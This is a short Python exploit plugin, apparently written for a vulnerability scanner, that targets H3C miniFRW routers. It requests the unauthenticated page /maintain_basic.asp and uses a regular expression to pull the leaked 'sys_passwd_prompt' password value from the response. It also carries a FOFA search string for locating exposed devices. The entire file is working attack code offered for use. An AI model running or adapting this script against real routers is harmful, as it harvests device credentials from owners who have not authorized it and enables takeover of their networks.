#coding:utf-8
import requests
import requests.packages.urllib3
requests.packages.urllib3.disable_warnings()
import re
def msg():
  ret = {

      'links'     :  'https://mp.weixin.qq.com/s/ZGp0NBVM0Xu8Pd3DkF2cxg',

      'huixian'   :  '',

      'method'    :   'get',

      'bugname'   :   'h3c minifrw路由器 sys_passwd_prompt信息泄露',

      'level'     :   'high',

      'FOFA'      :   'body="sys_passwd_prompt"',

      'author'    :   'ppxfx',

      'ifbug'     :   False,

      'create_time':  '2024/1/25',
  }
  return ret
def run(url,ua):
  ret = msg()
  headers = {
      'User-Agent': ua,
      }
  target = '/maintain_basic.asp'
  url1 = url + target
  ret['url'] = url1
  try:
    res=requests.get(url=url1,headers=headers,timeout=5,verify=False)
    if res.status_code == 200 and re.search(r'var sessionid.*?var over_time.*?var sys_passwd_prompt',res.text,re.S):
      resu = re.search(r'var sys_passwd_prompt.*?=.*?(?P<passwd>.*?);',res.text,re.S)
      ret['huixian'] = resu.group('passwd')
      res.close()
      ret['ifbug'] = True
      return ret
    else:
      return ret
  except:
    return ret